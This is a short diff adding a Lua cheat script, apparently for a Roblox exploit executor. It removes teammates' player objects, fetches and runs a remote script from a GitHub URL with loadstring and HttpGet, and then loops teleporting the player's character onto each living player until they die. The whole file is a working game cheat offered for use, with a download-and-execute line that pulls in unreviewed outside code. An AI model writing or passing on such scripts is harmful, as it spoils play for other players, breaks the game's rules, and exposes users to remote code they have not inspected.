@@ -1,0 +1,23 @@
+for i,v in pairs(game.Players:GetPlayers()) do
+   if v.Team == game:GetService("Players").LocalPlayer.Team and v ~= game:GetService("Players").LocalPlayer then
+       v:Destroy()
+   end
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joeengo/engoware/main/Main.lua"))()
+
+local Players = game:GetService("Players")
+
+getgenv().Toggle = true
+
+while getgenv().Toggle do
+   for _,v in pairs(Players:GetPlayers()) do
+       if v.Character and v.Character:FindFirstChildOfClass("Humanoid") and v.Character.Humanoid.Health ~= 0 and v ~= Players.LocalPlayer then
+           repeat
+               Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
+               task.wait(0.2)
+           until v.Character.Humanoid.Health <= 0
+       end
+   end
+   task.wait()
+end
